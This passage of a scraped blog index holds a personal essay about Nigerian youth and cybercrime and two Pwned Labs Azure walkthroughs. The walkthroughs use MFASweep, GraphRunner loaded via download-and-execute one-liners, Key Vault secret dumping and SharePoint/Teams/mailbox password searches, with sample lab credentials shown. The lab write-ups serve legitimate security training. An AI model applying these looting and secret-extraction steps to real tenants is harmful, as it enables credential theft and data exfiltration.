https://learn.microsoft.com/en-us/azure/automation/automation-security-overview ","permalink":"http://localhost:1313/hacking/unmask_privileged_access_in_azure/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nOverview As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated.","title":"Unmask Privileged Access In Azure"},{"content":"There are days when showing up feels like the hardest thing in the world. Sometimes I wonder, \u0026ldquo;Does any of this really count, or am I just working hard only to end up in a place that doesn\u0026rsquo;t even matter to me?\u0026rdquo;\nLife has taken on a different meaning for me after reading countless educational books, journals, and listening to all sorts of podcasts. Funny thing is, I was never that \u0026ldquo;smart kid\u0026rdquo; growing up. I absolutely hated math (seriously, what was with all those numbers?), and science wasn’t exactly my thing either. But technology? That’s always been my happy place.\nI remember back in high school (JSS3), my school had this rule that you had to learn a craft during the holiday before entering SS1. My mum, being a computer teacher with the Air Force, had me exposed to tech pretty early. So naturally, I found myself at Computer Village in Ikeja at 15, learning how to repair computers. I started with laptops replacing keyboards, screens, doing some motherboard magic, you know, the basic stuff.\nEventually, I moved on to fixing Android phones. I remember figuring out how to open the ones with sealed backs using a blade mostly Samsungs. I even learned how to service motherboards with this special fuel material (you really get creative out there!). Just when I was about to dive into repairing I-Phones, school was around the corner, and I had to hit pause on this journey.\nAll of this, I did purely for passion, not because I had to. But here\u0026rsquo;s the thing: passion can only take you so far. Some days, I’m not motivated at all, but I keep showing up. Why? Because discipline trumps motivation every single time.\nLife has a funny way of messing with your plans, right? Imagine you want to be this cool MTB rider, pulling off stunts and showing the world you’ve got skills. But after a lot of injuries, dedication, and your parents finally getting you your first bike, it breaks. Now, you’re stuck, not because you don’t want to keep going, but because the opportunity just doesn’t exist anymore. No equipment, no way to repair the bike and move on. Welcome to Nigeria, where not every kid gets the chance to live the life they envisioned, even if the dream was within reach. There’s always something ready to crush that vision.\nA lot of kids don’t even think about going into cybercrime. But picture this: you’ve learned a tech skill, and no one recognizes you. It’s like being in a pitch-black room where you have a lighter but no fuel to spark it. Meanwhile, everyone around you is getting ahead, and before you know it, you\u0026rsquo;re tempted to take shortcuts. Suddenly, your dream feels fragile, like it could slip away at any moment. And all your energy shifts to chasing something else, something you never planned for, but now this seems like the only option left.\nCybercrime has blown up in Nigeria, with kids masking it behind crypto and forex so their parents can believe it\u0026rsquo;s something legit. You see us pulling up in baggy pants and expensive hoodies, but the truth is, even if some people are doing things the right way, only about 10% of the kids on the block are actually playing it straight.\nI knew so many talented kids back in high school, ones who could’ve been brilliant and successful, if they had the right opportunities. But without those chances, they’ve had to rely on a mix of grace and hustle just to pull themselves out of the trenches. The thing is, life happens. If there was a survey asking people why they ended up doing things they never wanted to do, the answer would be simple: life pushed them to the wall.\nSure, some people have the strength to hang on and bounce back, but not everyone can hold on long enough. And that’s how you find them falling into the trap committing sins with an iPhone in hand. So, whose fault is that really?\nI’m not writing this expecting anyone to change, to be honest. I’m not the best at what I do, Just out here playing CTFs, landing open gigs (like report writing or quick web app/API Pentests), Preparing for certifications, putting in my best daily and Alhamdulillah, I’m grateful for where God has placed me. It’s never been easy, though. I’m writing this because I hope the struggles don’t last long, and I pray those of us doing things the right way aren’t pushed to the wall. I’m still surviving, hoping for better days when I can leave this soil and plant myself somewhere else, growing into the life I’ve always dreamed of, no matter what age it happens. Even though I’m far from perfect, I’ll get there.\nYou know, sometimes I sit back and wonder, do successful people really end up doing what they originally envisioned? Or is it all just part of some grand strategy, like they accidentally followed the right path, and boom success happened?\nThere are days when my head is full of random thoughts things that I wouldn’t even dare say out loud. Sometimes it feels like my brain is running its own chaotic marathon, and I’m just here, trying to keep up. Is it all garbage? Maybe. But I’m writing this down anyway to tell my future self: “Yo, wherever this path leads, remember you made those choices!” Haha, life’s crazy unpredictable like that.\nSuccess is like walking a tightrope one minute you’re balancing, and the next minute, you\u0026rsquo;re falling flat on your face. And you get back up, adjust your balance, and keep walking. But sometimes I wonder, what if I keep walking and never actually get to where I want to be? What if the finish line doesn’t even exist? I mean, how do you know if you’re on the right path when the path keeps shifting under your feet?\nAs I sit alone with these thoughts, it hits me: “Success is not final, failure is not fatal: It is the courage to continue that counts.” Yeah, Winston Churchill said that, and it feels more relevant than ever. Some days, it’s not about thriving, it’s just about surviving. You hope, you pray, you hustle, but deep down, you know life can flip on you at any moment. Sometimes it feels like a cosmic joke, like we’re all just winging it, trying not to trip over our own shoelaces.\nAnd let’s be real: life isn’t always about chasing a dream with some perfect plan. There’s beauty in stumbling through the chaos, in the unpredictability of it all. Like, there’s a kind of poetry in knowing that success doesn’t always come from a master plan it comes from \u0026ldquo;embracing the mess.\u0026rdquo; You make choices, you face the consequences, and you learn to smile through the uncertainty. I mean, what else can you do, right?\nBut on those dark days, when it feels like the weight of the world is pushing me to the wall, I remind myself: I’m still here. \u0026ldquo;The struggle you\u0026rsquo;re in today is developing the strength you need for tomorrow.\u0026rdquo; Some wise person on the internet probably said that, but it hits hard. Every setback, every mistake it’s all part of the process. The truth is, success isn’t linear. It\u0026rsquo;s like trying to navigate a maze in the dark, with no guarantee of ever finding the exit.\nIt’s kind of sad, actually. The dreams we have as kids can sometimes feel like distant memories, like they belong to someone else. We grow up, and reality kicks in. Opportunities slip away, life throws curveballs, and you find yourself questioning whether you even deserve the success you’re striving for. But here’s the thing, if I don’t get where I’m headed, it won’t be because I didn’t try. And in the end, that’s all that really matters.\nTo my future self: if you’re reading this and wondering how the hell you ended up wherever you are\u0026hellip;just know, you made these choices. You might not have figured everything out, but guess what? “Success is not the key to happiness. Happiness is the key to success.” So, as long as you’re happy, I think we’ll call it a win.\nFor now, I’ll keep walking this unpredictable path, knowing full well that I’m both terrified and excited to see where it leads. Because that’s what life is, A mix of fear, hope, hustle, and a whole lot of randomness.\nWritten By - \u0026ldquo;A trench kid\u0026rdquo; . ݁₊ 𓆉 . ݁𓇼˖ . ݁\n","permalink":"http://localhost:1313/hacking/journey_through_uncertainty/","summary":"There are days when showing up feels like the hardest thing in the world. Sometimes I wonder, \u0026ldquo;Does any of this really count, or am I just working hard only to end up in a place that doesn\u0026rsquo;t even matter to me?\u0026rdquo;\nLife has taken on a different meaning for me after reading countless educational books, journals, and listening to all sorts of podcasts. Funny thing is, I was never that \u0026ldquo;smart kid\u0026rdquo; growing up.","title":"Embracing the Chaos; My Journey Through Uncertainty"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner\nOverview -\u0026gt; Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.\nWe have been given compromised user credentials for this lab:\nPassword: xxxxxxxxxxxxxx IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account\nWe can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr \u0026#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1\u0026#39;) we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.\nADFS (Active Directory Federation Services) : A Microsoft service for enabling Single Sign-On (SSO) across applications.\nFederation: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc Single Sign-On (SSO) : Users authenticate once and access multiple applications without re-logging in. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password [REDACTED] -Recon -IncludeADFS ---------------- MFASweep ---------------- ---------------- Running recon checks ---------------- [*] Checking if ADFS configured... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. Confirm MFA Sweep [*] WARNING: This script is about to attempt logging into the Clara.Miller@megabigtech.com account TEN (10) different times (11 if you included ADFS). If you entered an incorrect password this may lock the account out. Are you sure you want to continue? [Y] Yes [N] No [?] Help (default is \u0026#34;Y\u0026#34;): ########################### Microsoft API Checks ########################### ---------------- Microsoft Graph API ---------------- [*] Authenticating to Microsoft Graph API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to https://graph.windows.net [***] NOTE: The \u0026#34;MSOnline\u0026#34; PowerShell module should work here. ---------------- Azure Service Management API ---------------- [*] Authenticating to Azure Service Management API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Azure Service Management API [***] NOTE: The \u0026#34;Az\u0026#34; PowerShell module should work here. ############################################################################################################ ########################### Microsoft Web Portal User Agent Checks ########################### ---------------- Microsoft 365 Web Portal w/ (Windows) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Windows) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ############################################################################################################ ---------------- Microsoft 365 Web Portal w/ (Linux) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Linux) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ########################### Legacy Auth Checks ########################### ---------------- Microsoft 365 Exchange Web Services ---------------- [*] Authenticating to Microsoft 365 Exchange Web Services (EWS)... [*] Login failed to O365 EWS. ---------------- Microsoft 365 ActiveSync ---------------- [*] Authenticating to Microsoft 365 Active Sync... InvalidOperation: Line | 852 | $resp = $_.Exception.Response.GetResponseStream() | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ | Method invocation failed because [System.Net.Http.HttpResponseMessage] does not contain a method named \u0026#39;GetResponseStream\u0026#39;. [*] Login to ActiveSync failed. ############################################################################################################ ############################################################################################################ ########################### ADFS Check ########################### ---------------- ADFS Authentication ---------------- [*] Getting ADFS URL... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. [*] Authenticating to On-Prem ADFS Portal at: ######### SINGLE FACTOR ACCESS RESULTS ######### Microsoft Graph API | YES Microsoft Service Management API | YES M365 w/ Windows UA | NO M365 w/ Linux UA | NO M365 w/ MacOS UA | NO M365 w/ Android UA | NO M365 w/ iPhone UA | NO M365 w/ Windows Phone UA | NO Exchange Web Services (BASIC Auth) | NO Active Sync (BASIC Auth) | NO ADFS | NO Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!\nMicrosoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement.\nWe can check if our current user has been assigned a Microsoft 365 license. Log in to Azure with Connect-AzAccount and Connect-MgGraph Then we can check for license availability with the Get-MgUserLicenseDetail cmdlet The most important information in the above screenshot is the SkuPartNumber value, which indicates the specific Microsoft 365 license assigned to the user. In this case, O365_BUSINESS_ESSENTIALS which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.\nWe can use the GraphRunner post-exploitation tool to loot in Microsoft 365 environments. We can go ahead and load this tool to powershell memory PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; IEX (iwr \u0026#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1\u0026#39;) ________ __ _______ by Beau Bullock (@dafthack) /_______/___________ ______ | |____/_______\\__ __ ____ ____ ___________ /___\\ __\\______\\____\\ \\_____\\|__|__\\|________/__|__\\/____\\ /____\\_/____\\______\\ \\ \\_\\ \\ | \\// __ \\| |_/ | Y \\ | \\ | / | \\ | \\ ___/| | \\/ \\________/__| (______/__| |___|__|____|___/____/|___|__/___|__/\\___| \u0026gt;__| Do service principals dream of electric sheep? For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki To list GraphRunner modules run List-GraphRunnerModules There is a blog by Black Hills Information Security which breaks down how to use this tool.\nWe can use the below cmdlet to list the available modules. List-GraphRunnerModules The \u0026ldquo;Pillage Modules\u0026rdquo; looks like the most interesting module though as it focuses on post-exploitation techniques. So first of all let go ahead and authenticate as our current user to the Microsoft Graph API.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-GraphTokens To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code G2XDH6EUF to authenticate. authorization_pending aud : 00000003-0000-0000-c000-000000000000 iss : https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/ iat : 1728122650 nbf : 1728122650 exp : 1728126800 acct : 0 acr : 1 aio : ATQAy/8YAAAA05ZBUjMFAJilG6sckNXmDe43/GFCaL2t9ywVn2fMbkoY9jVqvVH2NRnZZWQ8Mxna amr : {pwd} app_displayname : Microsoft Office appid : d3590ed6-52b3-4102-aeff-aad2292ab01c appidacr : 0 idtyp : user ipaddr : 102.89.68.17 name : Clara Miller oid : 36fa333d-1720-4920-8a5c-2b9b696c6adf --SNIP-- tenant_region_scope : EU tid : 2590ccef-687d-493b-ae8d-441cbab63a72 unique_name : Clara.Miller@megabigtech.com upn : Clara.Miller@megabigtech.com uti : ColAcrlKl0OTH5BHzLwkAA ver : 1.0 wids : {88d8e3e3-8f55-4a1e-953a-9b9898b8876b, b79fbf4d-3ef9-4689-8143-76b194e85509} xms_idrel : 10 1 xms_tcdt : 1671311182 [*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens) [!] Your access token is set to expire on: 10/05/2024 12:13:20 According to the above output, Some modules will require you use the -Tokens $tokens option, Just in case you don\u0026rsquo;t know what tokens are refer to this blog by @inversecos to understand more.\nIt is also possible to view the help page just like the --help option in bash but this time with the below command syntax starting with first Pillage Module\nGet-Help Invoke-SearchSharePointAndOneDrive -Examples We can then execute this module to search for files containing the string \u0026ldquo;password\u0026rdquo;.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \u0026#39;password\u0026#39; [*] Using the provided access tokens. [*] Found 2 matches for search term password Result [0] File Name: passwords.xlsx Location: https://iancloudpwned.sharepoint.com/Shared Documents/passwords.xlsx Created Date: 03/27/2024 00:13:10 Last Modified Date: 09/23/2024 21:02:42 Size: 14.79 KB File Preview: \u0026lt;c0\u0026gt;passwords\u0026lt;/c0\u0026gt; Site Username \u0026lt;c0\u0026gt;Password\u0026lt;/c0\u0026gt; Azure lindsey_adm $R4ncher2043 Dev Env r\u0026amp;d $MEGAPRODUCTS-\u0026lt;ddd/\u0026gt; DriveID \u0026amp; Item ID: b!bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3-8tuCtaeO-nKW9TKYT7NHHw0ABSux\\:017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD ================================================================================ Result [1] File Name: Finance Logins.docx Location: https://iancloudpwned.sharepoint.com/sites/FinanceTeam/Shared Documents/Finance Logins.docx Created Date: 11/06/2023 00:17:46 Last Modified Date: 11/06/2023 00:17:00 Size: 20.74 KB File Preview: \u0026lt;ddd/\u0026gt;\u0026lt;c0\u0026gt;PASSWORDS\u0026lt;/c0\u0026gt;) Service/Account: Finance Database URL: https://10.10.11.15/login Username: \u0026lt;ddd/\u0026gt; \u0026lt;c0\u0026gt;Password\u0026lt;/c0\u0026gt;: F1n@nc3Db2023! Service/Account: Accounting Software URL: https://accounting.\u0026lt;ddd/\u0026gt; DriveID \u0026amp; Item ID: b!XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI\\:01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ ================================================================================ [*] Do you want to download any of these files? (Yes/No/All) All [***] WARNING - Downloading ALL + 2 matches. [*] Now downloading passwords.xlsx [*] Now downloading Finance Logins.docx [*] Do you want to download any more files? (Yes/No/All) No [*] Quitting... As shown above we have two file retrieved the passwords.xlsx file and the Finance Logins.docx both hosted on the SharePoint site. We also downloaded the files by selecting All when prompted for a response.\nChecking each of this files we have hardcoded embedded credentials in which these logins can provide access to sensitive systems and data, and may also allow server access through abusable functionalities like file uploads or application vulnerabilities.\nFinance Logins.docx ::\npasswords.xlsx ::\nWe can also search for other sensitive files using the search term \u0026lsquo;bonus\u0026rsquo;.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \u0026#39;bonus\u0026#39; [*] Using the provided access tokens. [*] Found 1 matches for search term bonus Result [0] File Name: Bonuses - Confidential.xlsx Location: https://iancloudpwned-my.sharepoint.com/personal/sam_olsson_megabigtech_com/Documents/Bonuses - Confidential.xlsx Created Date: 11/05/2023 21:50:58 Last Modified Date: 11/05/2023 21:50:58 Size: 17.50 KB File Preview: DriveID \u0026amp; Item ID: b!qFVO5o9Td0OqTdtkAzLcOeLC9xqzoSxNgtanvmZOWlEk66ey-hWeTL_LW84ry4xf\\:01LMH7HCXMTDF5WDES3ZF3IDWGRV2P4OXB ================================================================================ [*] Do you want to download any of these files? (Yes/No/All) Yes [*] Enter the result number(s) of the file(s) that you want to download. Ex. \u0026#34;0,10,24\u0026#34; 0 [*] Now downloading Bonuses - Confidential.xlsx [*] Do you want to download any more files? (Yes/No/All) No [*] Quitting... As shown above a Bonuses - Confidential.xlsx was downloaded and trying to open this file we get the below message\nAfter trying all passwords we have gotten so far in which did not work, i decided to enumerate other Microsoft 365 services, starting with the Invoke-SearchTeams pillage module which searches for all Teams messages in all channels that are readable by the current user.\nInvoke-SearchTeams -Tokens $tokens -SearchTerm password As shown above i was able to get some passwords which worked and had access to the encrypted document.\nIt is also worth searching the mailbox of our current user using the Invoke-SearchMailbox in this context the user \u0026lsquo;`Clara.Miller\u0026rsquo;\nInvoke-SearchMailbox -Tokens $tokens -SearchTerm \u0026#34;password\u0026#34; -MessageCount 40 As shown above we got an image preview showing a username and password of the mbt-finance.database.windows.net server including DB named Finance. According to @pwnedlabs article the use of powershell and VS Code where implemented, But in this article, would show you how to use dbeaver, A community DB management tool.\nFirst of all download the tool using the apt package manager as shown below\nsudo apt install dbeaver Then open up dbeaver and if you don\u0026rsquo;t get the pop-up as shown in the below image use the hotkey shift+ctrl+N to open up the window and use the search term Azure then select \u0026ldquo;Azure SQL Server\u0026rdquo;\nEnter the connection details in the next window including the DB name, Credentials and Host name, Then click Finish once done.\nIf there was a successful host connection, you should see a drop down of different databases as shown below\nWe are mostly interested in the sequence; Database \u0026gt; Finance \u0026gt; Schemas \u0026gt; dbo \u0026gt; Tables \u0026gt; Subscriber \u0026gt; Columns. Where sensitive credentials are stored.\nThe best thing to do is to export the data in the Subscribers table so go ahead and right click on this table and select \u0026ldquo;Export Data\u0026rdquo;.\nYou should have a data transfer page, Go ahead and select which format you would like the data to be exported as, I love to use the JSON format, so i will go ahead and chose that.\nThen select Next with the default values until you get to the final page and hit Proceed to finally export the data to your user home folder.\nYou should get the prompt, completed, when the exportation is done and you can now view the exported data as shown below. Go ahead and submit the flag to complete the lab.\nBe cool ⋆˚🐾˖°\n","permalink":"http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner\nOverview -\u0026gt; Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access.","title":"Loot Exchange, Teams and SharePoint with GraphRunner"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault\nOverview After successfully compromising the Azure user account marcus@megabigtech.com and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data. Specifically they need us to assess the security of resources associated with the Azure Subscription ID \u0026ldquo;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026rdquo;.\nSetting Up Tools needed for this lab :\nPowerShell Azure CLI Microsoft Graph PowerShell SDK We need to enable tab completion in pwsh on Kali for faster command entry and navigation through available cmdlets and parameters.\nRunning \u0026ldquo;mousepad $profile\u0026rdquo; on the command line this should open up the powershell config file located at /home/sec-fortress/.config/powershell/Microsoft.PowerShell_profile.ps1 Register-ArgumentCompleter -Native -CommandName az -ScriptBlock { param($commandName, $wordToComplete, $cursorPosition) $completion_file = New-TemporaryFile $env:ARGCOMPLETE_USE_TEMPFILES = 1 $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file $env:COMP_LINE = $wordToComplete $env:COMP_POINT = $cursorPosition $env:_ARGCOMPLETE = 1 $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0 $env:_ARGCOMPLETE_IFS = \u0026#34;`n\u0026#34; $env:_ARGCOMPLETE_SHELL = \u0026#39;powershell\u0026#39; az 2\u0026gt;\u0026amp;1 | Out-Null Get-Content $completion_file | Sort-Object | ForEach-Object { [System.Management.Automation.CompletionResult]::new($_, $_, \u0026#34;ParameterValue\u0026#34;, $_) } Remove-Item $completion_file, Env:\\_ARGCOMPLETE_STDOUT_FILENAME, Env:\\ARGCOMPLETE_USE_TEMPFILES, Env:\\COMP_LINE, Env:\\COMP_POINT, Env:\\_ARGCOMPLETE, Env:\\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\\_ARGCOMPLETE_IFS, Env:\\_ARGCOMPLETE_SHELL } Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete WalkThrough For this lab the following authentication details where provided :\nIAM user : marcus@megabigtech.com Password : [REDACTED] Login Portal : https://portal.azure.com/ We can go ahead and login as the user marcus using the below command\naz login # Input Email and Password on the prompted browser Then to confirm that that we are in the execution context of the user we logged in as run the following command\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az account show { \u0026#34;environmentName\u0026#34;: \u0026#34;AzureCloud\u0026#34;, \u0026#34;homeTenantId\u0026#34;: \u0026#34;2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34;, \u0026#34;isDefault\u0026#34;: true, \u0026#34;managedByTenants\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;Microsoft Azure Sponsorship\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;Enabled\u0026#34;, \u0026#34;tenantDefaultDomain\u0026#34;: \u0026#34;megabigtech.com\u0026#34;, \u0026#34;tenantDisplayName\u0026#34;: \u0026#34;Default Directory\u0026#34;, \u0026#34;tenantId\u0026#34;: \u0026#34;2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx\u0026#34;, \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;marcus@megabigtech.com\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34; } } The next command allows us to get a Microsoft Graph session as current user.\nInstall-Module Microsoft.Graph # Install module Import-Module Microsoft.Graph.Users # Import module Connect-MgGraph Install-Module Az # Install module Import-Module Az # Import module Connect-AzAccount Note:\nThe Connect-AzAccount command logs you into your Azure account, allowing you to manage and interact with your Azure resources via PowerShell.\nThe Connect-MgGraph command logs you into Microsoft Graph, enabling you to interact with and manage Microsoft 365 services and data (like users, groups, and mail) via PowerShell.\nWe can then use the below command to show information about our current logged in user just as the whoami command in linux\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az ad signed-in-user show { \u0026#34;@odata.context\u0026#34;: \u0026#34;https://graph.microsoft.com/v1.0/$metadata#users/$entity\u0026#34;, \u0026#34;businessPhones\u0026#34;: [], \u0026#34;displayName\u0026#34;: \u0026#34;Marcus Hutch\u0026#34;, \u0026#34;givenName\u0026#34;: \u0026#34;Marcus\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;41c178d3-c246-4c00-98f0-8113bd631676\u0026#34;, \u0026#34;jobTitle\u0026#34;: \u0026#34;Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34;, \u0026#34;mail\u0026#34;: null, \u0026#34;mobilePhone\u0026#34;: null, \u0026#34;officeLocation\u0026#34;: null, \u0026#34;preferredLanguage\u0026#34;: null, \u0026#34;surname\u0026#34;: \u0026#34;Hutch\u0026#34;, \u0026#34;userPrincipalName\u0026#34;: \u0026#34;marcus@megabigtech.com\u0026#34; } it is possible to get the group membership of the user by running the following command. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-MgUserMemberOf -userid \u0026#34;marcus@megabigtech.com\u0026#34; | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\u0026#34;displayName\u0026#34;]} $_.AdditionalProperties[\u0026#34;displayName\u0026#34;] -------------------------------------- Directory Readers Default Directory All Company As shown in the above output every member of the Directory Readers group is allowed to enumerate Entra ID. Since we have permission, It is also important to enumerate further permissions to see if this user can access other Azure resources :\n# Given subscription ID $CurrentSubscriptionID = \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34; # Set output format $OutputFormat = \u0026#34;table\u0026#34; # Set the given subscription as the active one \u0026amp; az account set --subscription $CurrentSubscriptionID # List resources in the current subscription \u0026amp; az resource list -o $OutputFormat The below output tells us that the Azure Key Vault named ext-contractors contains a Key Vault (Microsoft.KeyVault/vaults). This makes the resource group highly sensitive because Azure Key Vaults are typically used to store:\nSecrets: Sensitive data such as passwords, API keys, tokens, or database connection strings. Encryption Keys: Used to encrypt/decrypt data, such as files or databases. Certificates: SSL/TLS certificates or other authentication-related certificates. We can then go ahead and check what\u0026rsquo;s inside the key vault with the below script. Make sure to replace the $VaultName and $SubscriptionID on your own personal engagement.\n# Set variables $VaultName = \u0026#34;ext-contractors\u0026#34; # Set the current Azure subscription $SubscriptionID = \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34; az account set --subscription $SubscriptionID # List and store the secrets $secretsJson = az keyvault secret list --vault-name $VaultName -o json $secrets = $secretsJson | ConvertFrom-Json # List and store the keys $keysJson = az keyvault key list --vault-name $VaultName -o json $keys = $keysJson | ConvertFrom-Json # Output the secrets Write-Host \u0026#34;Secrets in vault $VaultName\u0026#34; foreach ($secret in $secrets) { Write-Host $secret.id } # Output the keys Write-Host \u0026#34;Keys in vault $VaultName\u0026#34; foreach ($key in $keys) { Write-Host $key.id } The below output indicates that the ext-contractors vault contains secrets, and in addition to secrets, keys and certificates may also be stored in the same Key Vault. Azure Key Vault is designed to securely store secrets, encryption keys, and certificates, so it’s common to find all three types of data objects within a single vault.\nAlso take note that, Contractor and consultant accounts often have high privileges due to their temporary nature, making them prime targets for penetration testers and red teamers.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; ./keyvaultenum.ps1 Secrets in vault ext-contractors https://ext-contractors.vault.azure.net/secrets/alissa-suarez https://ext-contractors.vault.azure.net/secrets/josh-harvey https://ext-contractors.vault.azure.net/secrets/ryan-garcia Keys in vault ext-contractors We then need to see what we have in each of this Key Vault entries, Also make sure to replace the $VaultName, $SecretNames and $SubscriptionID in an engagement to get valid output.\n# Set variables $VaultName = \u0026#34;ext-contractors\u0026#34; $SecretNames = @(\u0026#34;alissa-suarez\u0026#34;, \u0026#34;josh-harvey\u0026#34;, \u0026#34;ryan-garcia\u0026#34;) # Set the current Azure subscription $SubscriptionID = \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34; az account set --subscription $SubscriptionID # Retrieve and output the secret values Write-Host \u0026#34;Secret Values from vault $VaultName\u0026#34; foreach ($SecretName in $SecretNames) { $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json $secretValue = ($secretValueJson | ConvertFrom-Json).value Write-Host \u0026#34;$SecretName - $secretValue\u0026#34; } As shown below the credentials for the three users where retrieved ;\nIt is also possible to enumerate all of this via the \u0026ldquo;Azure Portal\u0026rdquo; By clicking \u0026ldquo;All resources\u0026rdquo; on the portal or using the search bar with the specified search term.\nClick on the ext-contractors resource\nUnder objects \u0026gt; Secrets, you should find all user objects\nIt’s good practice to verify if the retrieved users are still active, enabled, or even exist in Entra ID or that they have the same password set, as password reuse is a very common bad practice.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az ad user list --query \u0026#34;[?givenName==\u0026#39;Alissa\u0026#39; || givenName==\u0026#39;Josh\u0026#39; || givenName==\u0026#39;Ryan\u0026#39;].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}\u0026#34; -o table Name UPN JobTitle ------------------------ ------------------------------- ------------------------------------------ Josh Harvey (Consultant) ext.josh.harvey@megabigtech.com Consultant (Customer DB Migration Project) The above result shows that the Josh Harvey contractor account is still available. We can go ahead and enumerate this account further.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-MgUser -UserId ext.josh.harvey@megabigtech.com DisplayName Id Mail UserPrincipalName ----------- -- ---- ----------------- Josh Harvey (Consultant) 6470f625-41ce-4233-a621-fad0aa0b7300 ext.josh.harvey@megabigtech.com With the above Id value we can query for groups that this user belongs to :\nPS sec-fortress@Pwn-F0rk-3X3C 